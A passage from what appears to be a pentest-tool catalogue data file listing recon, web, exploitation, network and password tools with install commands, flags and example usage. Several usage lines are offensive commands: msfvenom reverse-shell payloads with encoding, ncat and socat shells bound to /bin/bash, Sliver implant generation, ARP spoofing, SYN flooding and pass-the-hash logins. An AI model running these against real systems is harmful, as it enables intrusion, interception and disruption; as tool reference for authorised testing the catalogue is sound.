    kind: "local",
    desc: "Full-featured web reconnaissance framework with independent modules and database interaction",
    install: "sudo apt install -y recon-ng",
    usage: [
      "recon-ng",
      "recon-ng -w my_workspace",
      "recon-cli -m recon/domains-hosts/hackertarget -o SOURCE=example.com -x",
      "recon-ng -w test -C 'marketplace install all'",
      "recon-ng -w test -C 'modules load recon/domains-hosts/brute_hosts'",
    ],
    flags: [
      { flag: "-w", desc: "Specify or create a workspace name" },
      { flag: "-m", desc: "Load a specific module" },
      { flag: "-C", desc: "Pass a framework command on the command line" },
      { flag: "-x", desc: "Execute the loaded module immediately" },
      { flag: "-o", desc: "Set a module option (KEY=VALUE)" },
    ],
    links: "https://github.com/lanmaster53/recon-ng",
  },

  {
    id: "spiderfoot",
    name: "SpiderFoot",
    cat: "Recon",
    kind: "local",
    desc: "OSINT automation tool that queries 100+ public data sources for intelligence on IPs, domains, and emails",
    install: "pip install spiderfoot",
    usage: [
      "spiderfoot -l 127.0.0.1:5001",
      "spiderfoot -s example.com -t INTERNET_NAME,IP_ADDRESS -o tab",
      "spiderfoot -s example.com -m sfp_dnsresolve,sfp_dnsbrute",
      "spiderfoot -s john@example.com -t EMAILADDR",
      "spiderfoot -s example.com -o csv -F output.csv",
    ],
    flags: [
      { flag: "-l", desc: "IP:port to start the web UI listener" },
      { flag: "-s", desc: "Target to scan (domain, IP, email, etc.)" },
      { flag: "-t", desc: "Comma-separated event types to collect" },
      { flag: "-m", desc: "Comma-separated modules to run" },
      { flag: "-o", desc: "Output format: tab, csv, json" },
      { flag: "-F", desc: "Output file path" },
    ],
    links: "https://github.com/smicallef/spiderfoot",
  },

  {
    id: "fierce",
    name: "fierce",
    cat: "Recon",
    kind: "local",
    desc: "DNS reconnaissance tool for locating non-contiguous IP space and hostnames against domains",
    install: "pip install fierce",
    usage: [
      "fierce --domain example.com",
      "fierce --domain example.com --subdomains www mail vpn",
      "fierce --domain example.com --dns-servers 8.8.8.8",
      "fierce --domain example.com --traverse 8",
      "fierce --domain example.com --wide",
    ],
    flags: [
      { flag: "--domain", desc: "Target domain to scan" },
      { flag: "--subdomains", desc: "Specific subdomains to check" },
      { flag: "--dns-servers", desc: "DNS servers to use for lookups" },
      { flag: "--traverse", desc: "Scan IPs near discovered hosts (default 5)" },
      { flag: "--wide", desc: "Scan entire class C of discovered hosts" },
      { flag: "--delay", desc: "Delay between lookups in seconds" },
    ],
    links: "https://github.com/mschwager/fierce",
  },

  {
    id: "sublist3r",
    name: "Sublist3r",
    cat: "Recon",
    kind: "local",
    desc: "Subdomain enumeration tool using search engines, Netcraft, Virustotal, ThreatCrowd, and DNSdumpster",
    install: "pip install sublist3r",
    usage: [
      "sublist3r -d example.com",
      "sublist3r -d example.com -t 50",
      "sublist3r -d example.com -p 80,443 -v",
      "sublist3r -d example.com -o subdomains.txt",
      "sublist3r -d example.com -e google,virustotal",
    ],
    flags: [
      { flag: "-d", desc: "Target domain" },
      { flag: "-t", desc: "Number of threads (default 30)" },
      { flag: "-p", desc: "Scan found subdomains against these ports" },
      { flag: "-v", desc: "Verbose output, show results in real-time" },
      { flag: "-o", desc: "Save results to a text file" },
      { flag: "-e", desc: "Specific search engines to use" },
    ],
    links: "https://github.com/aboul3la/Sublist3r",
  },

  {
    id: "chaos-client",
    name: "Chaos",
    cat: "Recon",
    kind: "local",
    desc: "ProjectDiscovery Chaos client -- query their subdomain dataset for passive reconnaissance",
    install: "go install github.com/projectdiscovery/chaos-client/cmd/chaos@latest",
    usage: [
      "chaos -d example.com",
      "chaos -d example.com -silent",
      "chaos -d example.com -o subs.txt",
      "chaos -d example.com -count",
      "chaos -dL domains.txt -o all_subs.txt",
    ],
    flags: [
      { flag: "-d", desc: "Target domain" },
      { flag: "-dL", desc: "File containing list of target domains" },
      { flag: "-o", desc: "Output file for discovered subdomains" },
      { flag: "-silent", desc: "Show only subdomains in output" },
      { flag: "-count", desc: "Show only the subdomain count" },
      { flag: "-key", desc: "Chaos API key (or set PDCP_API_KEY env var)" },
    ],
    links: "https://github.com/projectdiscovery/chaos-client",
  },

  {
    id: "uncover",
    name: "uncover",
    cat: "Recon",
    kind: "local",
    desc: "Quickly discover exposed hosts on the internet using multiple search engines (Shodan, Censys, Fofa, Hunter)",
    install: "go install github.com/projectdiscovery/uncover/cmd/uncover@latest",
    usage: [
      "uncover -q 'apache country:US' -e shodan",
      "uncover -q 'ssl.cert.subject.cn:example.com' -e censys",
      "uncover -q 'title:\"login\"' -e fofa",
      "uncover -q 'org:\"Example Inc\"' -e shodan -f ip,port,host",
      "echo 'nginx' | uncover -e shodan,censys",
    ],
    flags: [
      { flag: "-q", desc: "Search query" },
      { flag: "-e", desc: "Search engine: shodan, censys, fofa, hunter, quake" },
      { flag: "-f", desc: "Fields to display (ip, port, host)" },
      { flag: "-l", desc: "Limit number of results per engine" },
      { flag: "-o", desc: "Output file" },
      { flag: "-silent", desc: "Show only results" },
    ],
    links: "https://github.com/projectdiscovery/uncover",
  },

  {
    id: "alterx",
    name: "alterx",
    cat: "Recon",
    kind: "local",
    desc: "Fast subdomain wordlist generator using DSL-based patterns for permutation and alteration",
    install: "go install github.com/projectdiscovery/alterx/cmd/alterx@latest",
    usage: [
      "echo example.com | alterx",
      "echo sub.example.com | alterx -enrich",
      "alterx -l subdomains.txt -p '{{word}}.{{suffix}}'",
      "echo api.example.com | alterx -en -o permutations.txt",
      "subfinder -d example.com | alterx | dnsx -silent",
    ],
    flags: [
      { flag: "-l", desc: "Input file with subdomains" },
      { flag: "-p", desc: "Custom permutation pattern using DSL" },
      { flag: "-en / -enrich", desc: "Enable enrichment with default wordlist" },
      { flag: "-o", desc: "Output file" },
      { flag: "-limit", desc: "Limit the number of permutations" },
      { flag: "-silent", desc: "Show only results" },
    ],
    links: "https://github.com/projectdiscovery/alterx",
  },

  {
    id: "puredns",
    name: "puredns",
    cat: "Recon",
    kind: "local",
    desc: "Fast domain resolver and subdomain bruteforcing tool that uses massdns under the hood",
    install: "go install github.com/d3mondev/puredns/v2@latest",
    usage: [
      "puredns bruteforce wordlist.txt example.com",
      "puredns resolve subdomains.txt",
      "puredns bruteforce wordlist.txt example.com --resolvers resolvers.txt",
      "puredns resolve subs.txt -q --write alive.txt",
      "puredns bruteforce best-dns-wordlist.txt example.com --rate-limit 500",
    ],
    flags: [
      { flag: "--resolvers", desc: "File with trusted DNS resolvers" },
      { flag: "--rate-limit", desc: "Limit queries per second" },
      { flag: "-q", desc: "Quiet mode, only show results" },
      { flag: "--write", desc: "Output file for valid domains" },
      { flag: "--wildcard-batch", desc: "Batch size for wildcard detection" },
    ],
    links: "https://github.com/d3mondev/puredns",
  },

  {
    id: "naabu",
    name: "naabu",
    cat: "Recon",
    kind: "local",
    desc: "Fast port scanner written in Go with SYN/CONNECT scan support and nmap integration",
    install: "go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest",
    usage: [
      "naabu -host example.com",
      "naabu -host example.com -p 80,443,8080-8090",
      "naabu -list hosts.txt -top-ports 1000",
      "naabu -host example.com -nmap-cli 'nmap -sV'",
      "naabu -host 192.168.1.0/24 -rate 5000 -o open_ports.txt",
    ],
    flags: [
      { flag: "-host", desc: "Target host or CIDR" },
      { flag: "-list", desc: "File containing list of hosts to scan" },
      { flag: "-p", desc: "Ports to scan (comma-separated or ranges)" },
      { flag: "-top-ports", desc: "Scan top N most common ports" },
      { flag: "-rate", desc: "Packets per second rate limit" },
      { flag: "-nmap-cli", desc: "Run nmap on discovered ports with given flags" },
      { flag: "-o", desc: "Output file" },
    ],
    links: "https://github.com/projectdiscovery/naabu",
  },

  // ---------------------------------------------------------------------------
  //  Web
  // ---------------------------------------------------------------------------

  {
    id: "paramspider",
    name: "ParamSpider",
    cat: "Web",
    kind: "local",
    desc: "Mining parameters from dark corners of web archives for bug bounty hunting and web application testing",
    install: "pip install paramspider",
    usage: [
      "paramspider -d example.com",
      "paramspider -d example.com --exclude woff,css,js,png,jpg",
      "paramspider -d example.com --level high",
      "paramspider -d example.com -o params.txt",
      "paramspider -d example.com --subs",
    ],
    flags: [
      { flag: "-d", desc: "Target domain" },
      { flag: "--exclude", desc: "Comma-separated extensions to exclude" },
      { flag: "--level", desc: "URL depth level: low, medium, high" },
      { flag: "-o", desc: "Output file for discovered parameters" },
      { flag: "--subs", desc: "Include subdomains" },
      { flag: "--placeholder", desc: "Placeholder for parameter values (default FUZZ)" },
    ],
    links: "https://github.com/devanshbatham/ParamSpider",
  },

  {
    id: "xsstrike",
    name: "XSStrike",
    cat: "Web",
    kind: "local",
    desc: "Advanced XSS detection suite with fuzzing engine, context analysis, and WAF detection/evasion",
    install: "pip install xsstrike",
    usage: [
      "xsstrike -u 'https://example.com/page?q=test'",
      "xsstrike -u 'https://example.com/search' --data 'query=test'",
      "xsstrike -u 'https://example.com/page?q=test' --crawl",
      "xsstrike -u 'https://example.com/page?q=test' --fuzzer",
      "xsstrike -u 'https://example.com/page?q=test' --blind",
    ],
    flags: [
      { flag: "-u", desc: "Target URL with parameter" },
      { flag: "--data", desc: "POST data string" },
      { flag: "--crawl", desc: "Crawl the target and test all forms" },
      { flag: "--fuzzer", desc: "Fuzz for filter/WAF detection" },
      { flag: "--blind", desc: "Test for blind XSS using a callback" },
      { flag: "-t", desc: "Number of threads (default 2)" },
      { flag: "--headers", desc: "Custom headers as JSON string" },
    ],
    links: "https://github.com/s0md3v/XSStrike",
  },

  {
    id: "sslyze",
    name: "SSLyze",
    cat: "Web",
    kind: "local",
    desc: "Fast and comprehensive TLS/SSL configuration analyzer to detect misconfigurations",
    install: "pip install sslyze",
    usage: [
      "sslyze example.com",
      "sslyze --regular example.com",
      "sslyze --certinfo example.com",
      "sslyze --heartbleed --openssl_ccs example.com",
      "sslyze --json_out results.json example.com:8443",
    ],
    flags: [
      { flag: "--regular", desc: "Run all standard scan commands" },
      { flag: "--certinfo", desc: "Verify certificate chain and trust" },
      { flag: "--heartbleed", desc: "Test for Heartbleed vulnerability" },
      { flag: "--openssl_ccs", desc: "Test for OpenSSL CCS injection" },
      { flag: "--json_out", desc: "Save results as JSON" },
      { flag: "--robot", desc: "Test for ROBOT vulnerability" },
    ],
    links: "https://github.com/nabla-c0d3/sslyze",
  },

  {
    id: "testssl",
    name: "testssl.sh",
    cat: "Web",
    kind: "local",
    desc: "Command-line tool to check TLS/SSL ciphers, protocols, and cryptographic flaws on any port",
    install: "sudo apt install -y testssl.sh",
    usage: [
      "testssl example.com",
      "testssl --full example.com:443",
      "testssl -e example.com",
      "testssl --vulnerable example.com",
      "testssl --json results.json example.com",
    ],
    flags: [
      { flag: "--full", desc: "Run all tests including individual ciphers" },
      { flag: "-e / --each-cipher", desc: "Test each local cipher against the server" },
      { flag: "--vulnerable", desc: "Test for all known vulnerabilities" },
      { flag: "--json", desc: "Save results as JSON" },
      { flag: "--html", desc: "Save results as HTML report" },
      { flag: "--severity", desc: "Show only findings at severity level or higher" },
    ],
    links: "https://github.com/drwetter/testssl.sh",
  },

  {
    id: "jwt-tool",
    name: "jwt_tool",
    cat: "Web",
    kind: "local",
    desc: "JWT security testing toolkit -- test for known JWT attacks including none algorithm and key confusion",
    install: "pip install jwt-tool",
    usage: [
      "jwt_tool eyJ0eXAi...",
      "jwt_tool eyJ0eXAi... -T",
      "jwt_tool eyJ0eXAi... -X a",
      "jwt_tool eyJ0eXAi... -C -d wordlist.txt",
      "jwt_tool eyJ0eXAi... -X k -pk public.pem",
    ],
    flags: [
      { flag: "-T", desc: "Tamper with token values interactively" },
      { flag: "-X a", desc: "Test all known exploit algorithms" },
      { flag: "-X k", desc: "Key confusion attack (RS256 -> HS256)" },
      { flag: "-C", desc: "Crack the HMAC secret with a dictionary" },
      { flag: "-d", desc: "Wordlist file for cracking" },
      { flag: "-pk", desc: "Public key file for key confusion attack" },
      { flag: "-I", desc: "Inject inline claim modifications" },
    ],
    links: "https://github.com/ticarpi/jwt_tool",
  },

  {
    id: "nosqlmap",
    name: "NoSQLMap",
    cat: "Web",
    kind: "local",
    desc: "Automated NoSQL database enumeration and web application exploitation tool for MongoDB and CouchDB",
    install: "pip install nosqlmap",
    usage: [
      "nosqlmap",
      "nosqlmap -u 'http://example.com/login' --data 'user=admin&pass=test'",
      "nosqlmap --attack 1 -u 'http://example.com/api'",
      "nosqlmap -u 'http://example.com/search?q=test' --method GET",
      "nosqlmap --dbPort 27017 --dbAddr 10.0.0.5",
    ],
    flags: [
      { flag: "-u", desc: "Target URL" },
      { flag: "--data", desc: "POST data string" },
      { flag: "--method", desc: "HTTP method (GET or POST)" },
      { flag: "--attack", desc: "Attack type: 1=boolean, 2=timing" },
      { flag: "--dbPort", desc: "Target database port" },
      { flag: "--dbAddr", desc: "Direct database IP address" },
    ],
    links: "https://github.com/codingo/NoSQLMap",
  },

  {
    id: "graphqlmap",
    name: "GraphQLmap",
    cat: "Web",
    kind: "local",
    desc: "Scripting engine to interact with GraphQL endpoints for pentesting -- introspection, injection, batching",
    install: "pip install graphqlmap",
    usage: [
      "graphqlmap -u https://example.com/graphql",
      "graphqlmap -u https://example.com/graphql --method POST",
      "graphqlmap -u https://example.com/graphql -v --dump",
      "graphqlmap -u https://example.com/graphql --inject '{user(id:\"1 OR 1=1\"){name}}'",
      "graphqlmap -u https://example.com/graphql --headers '{\"Auth\": \"Bearer tok\"}'",
    ],
    flags: [
      { flag: "-u", desc: "Target GraphQL endpoint URL" },
      { flag: "--method", desc: "HTTP method: GET or POST" },
      { flag: "--dump", desc: "Dump the entire schema via introspection" },
      { flag: "--inject", desc: "Custom injection query" },
      { flag: "-v", desc: "Verbose output" },
      { flag: "--headers", desc: "Custom HTTP headers as JSON" },
    ],
    links: "https://github.com/swisskyrepo/GraphQLmap",
  },

  {
    id: "corscanner",
    name: "CORScanner",
    cat: "Web",
    kind: "local",
    desc: "Detect CORS misconfigurations that may allow cross-origin data theft from vulnerable web applications",
    install: "pip install cors",
    usage: [
      "python cors_scan.py -u https://example.com",
      "python cors_scan.py -i urls.txt -t 10",
      "python cors_scan.py -u https://example.com -v",
      "python cors_scan.py -i urls.txt -o results.json",
      "python cors_scan.py -u https://example.com --headers 'Cookie: session=abc'",
    ],
    flags: [
      { flag: "-u", desc: "Target URL to check" },
      { flag: "-i", desc: "Input file with URLs (one per line)" },
      { flag: "-t", desc: "Number of threads (default 10)" },
      { flag: "-v", desc: "Verbose output" },
      { flag: "-o", desc: "Output results to JSON file" },
    ],
    links: "https://github.com/chenjj/CORScanner",
  },

  {
    id: "crlfuzz",
    name: "CRLFuzz",
    cat: "Web",
    kind: "local",
    desc: "Fast tool to scan CRLF injection vulnerabilities that can lead to HTTP response splitting attacks",
    install: "go install github.com/dwisiswant0/crlfuzz/cmd/crlfuzz@latest",
    usage: [
      "crlfuzz -u 'https://example.com'",
      "crlfuzz -l urls.txt",
      "crlfuzz -u 'https://example.com' -o results.txt",
      "crlfuzz -l urls.txt -c 50 -s",
      "cat urls.txt | crlfuzz -s",
    ],
    flags: [
      { flag: "-u", desc: "Target URL" },
      { flag: "-l", desc: "File containing list of URLs" },
      { flag: "-o", desc: "Output file" },
      { flag: "-c", desc: "Concurrency level (default 25)" },
      { flag: "-s", desc: "Silent mode, only show vulnerable URLs" },
      { flag: "-x", desc: "HTTP method to use (default GET)" },
    ],
    links: "https://github.com/dwisiswant0/crlfuzz",
  },

  {
    id: "smuggler",
    name: "Smuggler",
    cat: "Web",
    kind: "local",
    desc: "HTTP request smuggling and desync testing tool to detect CL.TE and TE.CL vulnerabilities",
    install: "git clone https://github.com/defparam/smuggler.git && cd smuggler && pip install -r requirements.txt",
    usage: [
      "python smuggler.py -u https://example.com",
      "python smuggler.py -u https://example.com -m CL-TE",
      "python smuggler.py -q -u https://example.com",
      "cat urls.txt | python smuggler.py",
      "python smuggler.py -u https://example.com --timeout 5",
    ],
    flags: [
      { flag: "-u", desc: "Target URL" },
      { flag: "-m", desc: "Mutation type: CL-TE, TE-CL, CL-CL, TE-TE" },
      { flag: "-q", desc: "Quiet mode, show only vulnerable results" },
      { flag: "--timeout", desc: "Socket timeout in seconds" },
      { flag: "-l", desc: "Log file for results" },
    ],
    links: "https://github.com/defparam/smuggler",
  },

  // ---------------------------------------------------------------------------
  //  Exploitation
  // ---------------------------------------------------------------------------

  {
    id: "msfvenom",
    name: "msfvenom",
    cat: "Exploitation",
    kind: "local",
    desc: "Metasploit payload generator and encoder -- create shellcode, executables, and scripts for various platforms",
    install: "sudo apt install -y metasploit-framework",
    usage: [
      "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe",
      "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf",
      "msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.php",
      "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe",
      "msfvenom -l payloads | grep windows",
    ],
    flags: [
      { flag: "-p", desc: "Payload to use (e.g. windows/meterpreter/reverse_tcp)" },
      { flag: "-f", desc: "Output format: exe, elf, raw, python, c, js, etc." },
      { flag: "-o", desc: "Output file path" },
      { flag: "-e", desc: "Encoder to use (e.g. x86/shikata_ga_nai)" },
      { flag: "-i", desc: "Number of encoding iterations" },
      { flag: "-l", desc: "List available payloads, encoders, formats, etc." },
      { flag: "-b", desc: "Bad characters to avoid (e.g. '\\x00\\x0a')" },
    ],
    links: "https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html",
  },

  {
    id: "evil-winrm",
    name: "Evil-WinRM",
    cat: "Exploitation",
    kind: "local",
    desc: "WinRM shell for hacking and pentesting -- supports file transfers, in-memory .NET loading, and more",
    install: "gem install evil-winrm",
    usage: [
      "evil-winrm -i 10.0.0.5 -u administrator -p 'Password123!'",
      "evil-winrm -i 10.0.0.5 -u admin -H aad3b435b51404eeaad3b435b51404ee",
      "evil-winrm -i 10.0.0.5 -u admin -p pass -s /opt/scripts/ -e /opt/exes/",
      "evil-winrm -i 10.0.0.5 -u admin -k -c cert.pem -K key.pem",
      "evil-winrm -i 10.0.0.5 -u admin -p pass -P 5986 -S",
    ],
    flags: [
      { flag: "-i", desc: "Target IP address" },
      { flag: "-u", desc: "Username" },
      { flag: "-p", desc: "Password" },
      { flag: "-H", desc: "NTLM hash for pass-the-hash" },
      { flag: "-s", desc: "Path to PowerShell scripts directory" },
      { flag: "-e", desc: "Path to executables directory" },
      { flag: "-S", desc: "Use SSL (port 5986)" },
      { flag: "-P", desc: "Custom port" },
    ],
    links: "https://github.com/Hackplayers/evil-winrm",
  },

  {
    id: "chisel",
    name: "Chisel",
    cat: "Exploitation",
    kind: "local",
    desc: "Fast TCP/UDP tunnel over HTTP, secured via SSH -- useful for pivoting through firewalls",
    install: "go install github.com/jpillora/chisel@latest",
    usage: [
      "chisel server --reverse --port 8080",
      "chisel client 10.0.0.1:8080 R:9090:127.0.0.1:9090",
      "chisel client 10.0.0.1:8080 R:socks",
      "chisel server --port 8080 --auth user:pass",
      "chisel client --auth user:pass 10.0.0.1:8080 3306:10.0.0.5:3306",
    ],
    flags: [
      { flag: "server", desc: "Run in server mode" },
      { flag: "client", desc: "Run in client mode" },
      { flag: "--reverse", desc: "Allow clients to open reverse tunnels" },
      { flag: "--port", desc: "Server listening port (default 8080)" },
      { flag: "--auth", desc: "Authentication credentials (user:pass)" },
      { flag: "R:socks", desc: "Create a reverse SOCKS5 proxy" },
    ],
    links: "https://github.com/jpillora/chisel",
  },

  {
    id: "ligolo-ng",
    name: "Ligolo-ng",
    cat: "Exploitation",
    kind: "local",
    desc: "Advanced tunneling and pivoting tool that creates a virtual network interface for transparent proxying",
    install: "go install github.com/nicocha30/ligolo-ng@latest",
    usage: [
      "ligolo-proxy -selfcert -laddr 0.0.0.0:11601",
      "ligolo-agent -connect attacker:11601 -ignore-cert",
      "# In proxy console: session -> start -> ifconfig",
      "sudo ip route add 10.10.0.0/24 dev ligolo",
      "# In proxy console: listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:1234",
    ],
    flags: [
      { flag: "-selfcert", desc: "Use self-signed TLS certificate" },
      { flag: "-laddr", desc: "Listening address for proxy" },
      { flag: "-connect", desc: "Proxy address for agent to connect to" },
      { flag: "-ignore-cert", desc: "Skip TLS certificate verification" },
      { flag: "-retry", desc: "Auto-retry on connection loss" },
    ],
    links: "https://github.com/nicocha30/ligolo-ng",
  },

  {
    id: "pwncat",
    name: "pwncat-cs",
    cat: "Exploitation",
    kind: "local",
    desc: "Post-exploitation platform and communication channel framework with automated privilege escalation",
    install: "pipx install pwncat-cs",
    usage: [
      "pwncat-cs -lp 4444",
      "pwncat-cs -lp 4444 -m linux",
      "pwncat-cs connect -l -p 4444",
      "pwncat-cs ssh://user:pass@10.0.0.5",
      "# In pwncat: run enumerate -> run escalate.auto",
    ],
    flags: [
      { flag: "-lp", desc: "Listen on a port for incoming connections" },
      { flag: "-m", desc: "Target platform: linux, windows" },
      { flag: "connect", desc: "Connect or listen for a session" },
      { flag: "ssh://", desc: "Connect via SSH" },
      { flag: "run", desc: "Execute post-exploitation modules" },
    ],
    links: "https://github.com/calebstewart/pwncat",
  },

  {
    id: "sliver",
    name: "Sliver",
    cat: "Exploitation",
    kind: "local",
    desc: "Open-source C2 framework supporting implant generation, mTLS, HTTP(S), DNS, and WireGuard transports",
    install: "curl https://sliver.sh/install | sudo bash",
    usage: [
      "sliver",
      "# In console: generate --mtls 10.0.0.1 --os windows --save implant.exe",
      "# In console: mtls --lhost 0.0.0.0 --lport 8888",
      "# In console: http --lhost 0.0.0.0 --lport 80",
      "# In console: sessions -> use <id> -> shell",
    ],
    flags: [
      { flag: "generate", desc: "Generate a new implant binary" },
      { flag: "--mtls", desc: "Use mutual TLS transport" },
      { flag: "--http", desc: "Use HTTP(S) transport" },
      { flag: "--dns", desc: "Use DNS transport" },
      { flag: "--os", desc: "Target OS: windows, linux, darwin" },
      { flag: "--save", desc: "Save generated implant to file" },
    ],
    links: "https://github.com/BishopFox/sliver",
  },

  // ---------------------------------------------------------------------------
  //  Network
  // ---------------------------------------------------------------------------

  {
    id: "mitm6",
    name: "mitm6",
    cat: "Network",
    kind: "local",
    desc: "Exploit IPv6 networking to perform man-in-the-middle attacks against Windows targets via DHCPv6 and DNS",
    install: "pipx install mitm6",
    usage: [
      "mitm6 -d example.local",
      "mitm6 -d example.local -i eth0",
      "mitm6 -d example.local --ignore-nofqdn",
      "mitm6 -d example.local -hw dc01.example.local",
      "mitm6 -d example.local --filter-host dc01",
    ],
    flags: [
      { flag: "-d", desc: "Target domain (e.g. example.local)" },
      { flag: "-i", desc: "Network interface to use" },
      { flag: "--ignore-nofqdn", desc: "Respond to non-FQDN queries" },
      { flag: "-hw", desc: "Allowlist a specific host" },
      { flag: "--filter-host", desc: "Only target a specific host" },
      { flag: "-a", desc: "IPv4 address to relay to" },
    ],
    links: "https://github.com/dirkjanm/mitm6",
  },

  {
    id: "bettercap",
    name: "Bettercap",
    cat: "Network",
    kind: "local",
    desc: "Swiss army knife for network attacks and monitoring -- WiFi, BLE, ethernet MITM, HTTP(S) proxy, and more",
    install: "sudo apt install -y bettercap",
    usage: [
      "sudo bettercap -iface eth0",
      "sudo bettercap -iface wlan0 -eval 'wifi.recon on'",
      "sudo bettercap -caplet http-ui",
      "sudo bettercap -iface eth0 -eval 'net.probe on; net.recon on; net.sniff on'",
      "sudo bettercap -iface eth0 -eval 'set arp.spoof.targets 192.168.1.50; arp.spoof on'",
    ],
    flags: [
      { flag: "-iface", desc: "Network interface to use" },
      { flag: "-eval", desc: "Run commands at startup" },
      { flag: "-caplet", desc: "Load a caplet (script) file" },
      { flag: "-no-history", desc: "Disable readline history" },
      { flag: "-silent", desc: "Suppress banner and status messages" },
      { flag: "-cpu-profile", desc: "Write CPU profile to file" },
    ],
    links: "https://www.bettercap.org/",
  },

  {
    id: "hping3",
    name: "hping3",
    cat: "Network",
    kind: "local",
    desc: "Network tool to send custom TCP/IP packets -- useful for firewall testing, port scanning, and OS fingerprinting",
    install: "sudo apt install -y hping3",
    usage: [
      "hping3 -S -p 80 example.com",
      "hping3 --flood -S -p 80 10.0.0.1",
      "hping3 -1 -c 5 10.0.0.1",
      "hping3 -S --scan 1-1000 10.0.0.1",
      "hping3 -A -p 80 10.0.0.1",
    ],
    flags: [
      { flag: "-S", desc: "Set SYN flag" },
      { flag: "-A", desc: "Set ACK flag" },
      { flag: "-p", desc: "Destination port" },
      { flag: "--flood", desc: "Send packets as fast as possible" },
      { flag: "-1", desc: "ICMP mode" },
      { flag: "-c", desc: "Number of packets to send" },
      { flag: "--scan", desc: "Port scan mode (range)" },
    ],
    links: "https://github.com/antirez/hping",
  },

  {
    id: "netcat",
    name: "Netcat (ncat)",
    cat: "Network",
    kind: "local",
    desc: "Networking utility for reading/writing data across network connections using TCP or UDP",
    install: "sudo apt install -y ncat",
    usage: [
      "ncat -lvnp 4444",
      "ncat 10.0.0.1 4444",
      "ncat -lvnp 4444 -e /bin/bash",
      "ncat --ssl -lvnp 443",
      "ncat -u -lvnp 5353",
    ],
    flags: [
      { flag: "-l", desc: "Listen mode" },
      { flag: "-v", desc: "Verbose output" },
      { flag: "-n", desc: "Skip DNS resolution" },
      { flag: "-p", desc: "Local port number" },
      { flag: "-e", desc: "Execute a command on connection" },
      { flag: "--ssl", desc: "Use SSL/TLS encryption" },
      { flag: "-u", desc: "Use UDP instead of TCP" },
    ],
    links: "https://nmap.org/ncat/",
  },

  {
    id: "socat",
    name: "socat",
    cat: "Network",
    kind: "local",
    desc: "Multipurpose relay tool -- bidirectional data transfer between two independent data channels",
    install: "sudo apt install -y socat",
    usage: [
      "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash",
      "socat TCP:10.0.0.1:4444 -",
      "socat TCP-LISTEN:8080,fork TCP:10.0.0.5:80",
      "socat OPENSSL-LISTEN:443,cert=server.pem,fork EXEC:/bin/sh",
      "socat - UDP:10.0.0.1:5353",
    ],
    flags: [
      { flag: "TCP-LISTEN", desc: "Listen on a TCP port" },
      { flag: "TCP", desc: "Connect to a TCP address:port" },
      { flag: "OPENSSL-LISTEN", desc: "Listen with TLS encryption" },
      { flag: "EXEC", desc: "Execute a program on connection" },
      { flag: "fork", desc: "Handle multiple connections" },
      { flag: "reuseaddr", desc: "Allow port reuse" },
    ],
    links: "https://linux.die.net/man/1/socat",
  },

  {
    id: "ettercap",
    name: "Ettercap",
    cat: "Network",
    kind: "local",
    desc: "Comprehensive suite for man-in-the-middle attacks -- ARP spoofing, DNS spoofing, and protocol dissection",
    install: "sudo apt install -y ettercap-text-only",
    usage: [
      "sudo ettercap -T -q -i eth0 -M arp:remote /10.0.0.1// /10.0.0.5//",
      "sudo ettercap -T -i eth0 -P dns_spoof",
      "sudo ettercap -G",
      "sudo ettercap -T -q -i eth0 -w capture.pcap -M arp /10.0.0.0/24//",
      "sudo ettercap -T -i eth0 -F filter.ef",
    ],
    flags: [
      { flag: "-T", desc: "Text-only interface" },
      { flag: "-G", desc: "GTK graphical interface" },
      { flag: "-i", desc: "Network interface" },
      { flag: "-M", desc: "MITM method (arp, icmp, dhcp, port)" },
      { flag: "-P", desc: "Load a plugin" },
      { flag: "-w", desc: "Write captured data to pcap file" },
      { flag: "-F", desc: "Load an etterfilter file" },
    ],
    links: "https://www.ettercap-project.org/",
  },

  {
    id: "arpwatch",
    name: "arpwatch",
    cat: "Network",
    kind: "local",
    desc: "Monitor ethernet/IP address pairings and detect ARP spoofing attacks on a network",
    install: "sudo apt install -y arpwatch",
    usage: [
      "sudo arpwatch -i eth0",
      "sudo arpwatch -i eth0 -f /var/lib/arpwatch/arp.dat",
      "sudo arpwatch -i eth0 -m admin@example.com",
      "sudo arpwatch -d -i eth0",
      "sudo arpwatch -n 192.168.1.0/24 -i eth0",
    ],
    flags: [
      { flag: "-i", desc: "Network interface to monitor" },
      { flag: "-f", desc: "Data file to read/write address pairs" },
      { flag: "-m", desc: "Email address for notifications" },
      { flag: "-d", desc: "Debug mode (do not fork into background)" },
      { flag: "-n", desc: "Network to monitor (CIDR)" },
    ],
    links: "https://linux.die.net/man/8/arpwatch",
  },

  // ---------------------------------------------------------------------------
  //  Passwords
  // ---------------------------------------------------------------------------

  {
    id: "cewl",
    name: "CeWL",
    cat: "Passwords",
    kind: "local",
    desc: "Custom wordlist generator that spiders a website and extracts unique words for password cracking",
    install: "sudo apt install -y cewl",
    usage: [
      "cewl https://example.com -w wordlist.txt",
      "cewl https://example.com -d 3 -m 6",
      "cewl https://example.com -e --email_file emails.txt",
      "cewl https://example.com --with-numbers -w words.txt",
      "cewl https://example.com -c -w counted.txt",
    ],
    flags: [
      { flag: "-w", desc: "Output wordlist file" },
      { flag: "-d", desc: "Depth to spider (default 2)" },
      { flag: "-m", desc: "Minimum word length (default 3)" },
      { flag: "-e", desc: "Include email addresses found" },
      { flag: "--email_file", desc: "File to save extracted emails" },
      { flag: "--with-numbers", desc: "Include words with numbers" },
      { flag: "-c", desc: "Show word count alongside each word" },
    ],
    links: "https://github.com/digininja/CeWL",
  },

  {
    id: "cupp",
    name: "CUPP",
    cat: "Passwords",
    kind: "local",
    desc: "Common User Passwords Profiler -- generate targeted wordlists based on personal information about a target",
    install: "sudo apt install -y cupp",
    usage: [
      "cupp -i",
      "cupp -w wordlist.txt",
      "cupp -l",
      "cupp -a",
      "cupp -i -q",
    ],
    flags: [
      { flag: "-i", desc: "Interactive mode -- answer questions to build a profile" },
      { flag: "-w", desc: "Improve an existing wordlist with leet speak and more" },
      { flag: "-l", desc: "Download default wordlists from repository" },
